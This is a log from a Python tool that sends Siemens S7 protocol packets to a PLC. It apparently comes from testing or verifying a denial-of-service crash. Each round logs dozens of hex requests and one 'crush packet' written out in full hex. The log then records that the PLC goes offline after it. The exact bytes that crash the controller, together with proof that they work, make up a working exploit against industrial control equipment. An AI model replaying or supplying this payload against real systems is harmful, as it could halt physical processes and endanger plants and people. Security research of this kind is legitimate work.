[2021-12-19 20:27:41,382] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009001000800080001120411440100ff090004001c0000
[2021-12-19 20:27:41,586] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009101000800080001120411440100ff090004001c0000
[2021-12-19 20:27:41,789] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009201000800080001120411440100ff090004001c0000
[2021-12-19 20:27:41,994] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009301000800080001120411440100ff090004001c0000
[2021-12-19 20:27:42,199] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009401000800080001120411440100ff090004001c0000
[2021-12-19 20:27:42,406] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009501000800080001120411440100ff090004001c0000
[2021-12-19 20:27:42,610] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009601000800080001120411440100ff090004001c0000
[2021-12-19 20:27:42,816] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009701000800080001120411440100ff090004001c0000
[2021-12-19 20:27:43,019] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009801000800080001120411440100ff090004001c0000
[2021-12-19 20:27:43,227] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009901000800080001120411440100ff090004001c0000
[2021-12-19 20:27:43,429] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009a01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:43,643] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009b01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:43,845] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009c01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:44,048] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009d01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:44,253] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009e01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:44,456] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700009f01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:44,917] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:27:44,918] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000a001000e00000401120a10010003000083000001
[2021-12-19 20:27:45,127] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a101000800080001120411440100ff090004001c0000
[2021-12-19 20:27:45,344] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a201000800080001120411440100ff090004001c0000
[2021-12-19 20:27:45,561] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a301000800080001120411440100ff090004001c0000
[2021-12-19 20:27:45,764] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a401000800080001120411440100ff090004001c0000
[2021-12-19 20:27:45,967] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a501000800080001120411440100ff090004001c0000
[2021-12-19 20:27:46,171] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a601000800080001120411440100ff090004001c0000
[2021-12-19 20:27:46,374] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a701000800080001120411440100ff090004001c0000
[2021-12-19 20:27:46,577] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a801000800080001120411440100ff090004001c0000
[2021-12-19 20:27:46,783] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000a901000800080001120411440100ff090004001c0000
[2021-12-19 20:27:46,988] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000aa01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:47,196] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ab01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:47,401] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ac01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:47,606] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ad01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:47,811] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ae01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:48,017] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000af01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:48,224] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b001000800080001120411440100ff090004001c0000
[2021-12-19 20:27:48,428] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b101000800080001120411440100ff090004001c0000
[2021-12-19 20:27:48,634] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b201000800080001120411440100ff090004001c0000
[2021-12-19 20:27:48,837] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b301000800080001120411440100ff090004001c0000
[2021-12-19 20:27:49,041] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b401000800080001120411440100ff090004001c0000
[2021-12-19 20:27:49,244] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b501000800080001120411440100ff090004001c0000
[2021-12-19 20:27:49,449] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b601000800080001120411440100ff090004001c0000
[2021-12-19 20:27:49,654] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b701000800080001120411440100ff090004001c0000
[2021-12-19 20:27:49,861] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b801000800080001120411440100ff090004001c0000
[2021-12-19 20:27:50,065] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000b901000800080001120411440100ff090004001c0000
[2021-12-19 20:27:50,269] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ba01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:50,474] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bb01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:50,678] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bc01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:50,881] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bd01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:51,083] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000be01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:51,290] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000bf01000800080001120411440100ff090004001c0000
[2021-12-19 20:27:51,492] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c001000800080001120411440100ff090004001c0000
[2021-12-19 20:27:51,697] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c101000800080001120411440100ff090004001c0000
[2021-12-19 20:27:51,904] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c201000800080001120411440100ff090004001c0000
[2021-12-19 20:27:52,108] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c301000800080001120411440100ff090004001c0000
[2021-12-19 20:27:52,311] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c401000800080001120411440100ff090004001c0000
[2021-12-19 20:27:52,517] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c501000800080001120411440100ff090004001c0000
[2021-12-19 20:27:52,721] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c601000800080001120411440100ff090004001c0000
[2021-12-19 20:27:52,928] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c701000800080001120411440100ff090004001c0000
[2021-12-19 20:27:53,132] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000c801000800080001120411440100ff090004001c0000
[2021-12-19 20:27:53,227] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:27:53,335] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:28:05,389] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:28:05,390] [INFO] [vertifyPassiveARP.<module>] -> No: 6, sended packets 64 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:28:10,690] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:28:13,746] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect request]0300001902f08032010000c90100080000f000000a000a00f0
[2021-12-19 20:28:13,747] [INFO] [verifyClient.send_receive_s7_packet] -> [Connect responde]0300001b02f08032030000c901000800000000f0000003000300f0
[2021-12-19 20:28:15,756] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:28:15,756] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 25
[2021-12-19 20:28:15,763] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ca01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:15,976] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cb01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:16,181] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cc01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:16,387] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cd01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:16,592] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ce01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:16,796] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000cf01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:17,003] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d001000800080001120411440100ff090004001c0000
[2021-12-19 20:28:17,206] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d101000800080001120411440100ff090004001c0000
[2021-12-19 20:28:17,414] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d201000800080001120411440100ff090004001c0000
[2021-12-19 20:28:17,616] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d301000800080001120411440100ff090004001c0000
[2021-12-19 20:28:17,820] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d401000800080001120411440100ff090004001c0000
[2021-12-19 20:28:18,023] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d501000800080001120411440100ff090004001c0000
[2021-12-19 20:28:18,240] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d601000800080001120411440100ff090004001c0000
[2021-12-19 20:28:18,456] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d701000800080001120411440100ff090004001c0000
[2021-12-19 20:28:18,673] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d801000800080001120411440100ff090004001c0000
[2021-12-19 20:28:18,890] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000d901000800080001120411440100ff090004001c0000
[2021-12-19 20:28:19,095] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000da01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:19,300] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000db01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:19,507] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dc01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:19,713] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000dd01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:19,916] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000de01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:20,120] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000df01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:20,324] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e001000800080001120411440100ff090004001c0000
[2021-12-19 20:28:20,529] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e101000800080001120411440100ff090004001c0000
[2021-12-19 20:28:20,733] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e201000800080001120411440100ff090004001c0000
[2021-12-19 20:28:21,245] [INFO] [verifyClient.send_s7_packet] -> Send the crush packet
[2021-12-19 20:28:21,246] [INFO] [verifyClient.send_s7_packet] -> [request]0300001f02f08032010000e301000e00000401120a10010003000083000001
[2021-12-19 20:28:21,452] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e401000800080001120411440100ff090004001c0000
[2021-12-19 20:28:21,655] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e501000800080001120411440100ff090004001c0000
[2021-12-19 20:28:21,858] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e601000800080001120411440100ff090004001c0000
[2021-12-19 20:28:22,061] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e701000800080001120411440100ff090004001c0000
[2021-12-19 20:28:22,265] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e801000800080001120411440100ff090004001c0000
[2021-12-19 20:28:22,480] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000e901000800080001120411440100ff090004001c0000
[2021-12-19 20:28:22,684] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ea01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:22,887] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000eb01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:23,091] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ec01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:23,293] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ed01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:23,495] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ee01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:23,699] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ef01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:23,903] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f001000800080001120411440100ff090004001c0000
[2021-12-19 20:28:24,106] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f101000800080001120411440100ff090004001c0000
[2021-12-19 20:28:24,312] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f201000800080001120411440100ff090004001c0000
[2021-12-19 20:28:24,517] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f301000800080001120411440100ff090004001c0000
[2021-12-19 20:28:24,723] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f401000800080001120411440100ff090004001c0000
[2021-12-19 20:28:24,926] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f501000800080001120411440100ff090004001c0000
[2021-12-19 20:28:25,132] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f601000800080001120411440100ff090004001c0000
[2021-12-19 20:28:25,339] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f701000800080001120411440100ff090004001c0000
[2021-12-19 20:28:25,541] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f801000800080001120411440100ff090004001c0000
[2021-12-19 20:28:25,744] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000f901000800080001120411440100ff090004001c0000
[2021-12-19 20:28:25,947] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fa01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:26,151] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fb01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:26,358] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fc01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:26,560] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fd01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:26,764] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000fe01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:26,980] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f08032070000ff01000800080001120411440100ff090004001c0000
[2021-12-19 20:28:27,185] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000002000800080001120411440100ff090004001c0000
[2021-12-19 20:28:27,390] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000102000800080001120411440100ff090004001c0000
[2021-12-19 20:28:27,595] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000202000800080001120411440100ff090004001c0000
[2021-12-19 20:28:27,801] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000302000800080001120411440100ff090004001c0000
[2021-12-19 20:28:28,008] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000402000800080001120411440100ff090004001c0000
[2021-12-19 20:28:28,215] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000502000800080001120411440100ff090004001c0000
[2021-12-19 20:28:28,422] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000602000800080001120411440100ff090004001c0000
[2021-12-19 20:28:28,628] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000702000800080001120411440100ff090004001c0000
[2021-12-19 20:28:28,836] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000802000800080001120411440100ff090004001c0000
[2021-12-19 20:28:29,041] [INFO] [verifyClient.send_s7_packet] -> [request]0300002102f080320700000902000800080001120411440100ff090004001c0000
[2021-12-19 20:28:29,228] [INFO] [vertifyPassiveARP.passiveCallback] -> passiveDetect find a Crush
[2021-12-19 20:28:29,243] [INFO] [verifyClient.activeDetect] -> checking whether the PLC is online
[2021-12-19 20:28:41,294] [INFO] [verifyClient.activeDetect] -> the PLC is offline
[2021-12-19 20:28:41,294] [INFO] [vertifyPassiveARP.<module>] -> No: 7, sended packets 64 ,passiveDetected find a Crush, The activeDetect ans is Crush
[2021-12-19 20:28:46,610] [INFO] [verifyClient.connect] -> Start connect PLC
[2021-12-19 20:28:48,273] [ERROR] [verifyClient.send_receive_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 20:28:48,277] [ERROR] [verifyClient.send_receive_s7_packet] -> file descriptor cannot be a negative integer (-1)
[2021-12-19 20:28:50,278] [INFO] [verifyClient.passiveDetect] -> start listen arp
[2021-12-19 20:28:50,278] [INFO] [vertifyPassiveARP.<module>] -> The Crush Packet is 39
[2021-12-19 20:28:50,283] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:50,483] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:50,690] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:50,894] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:51,101] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:51,308] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:51,514] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:51,721] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:51,926] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:52,126] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
[2021-12-19 20:28:52,331] [ERROR] [verifyClient.send_s7_packet] -> [WinError 10038] 
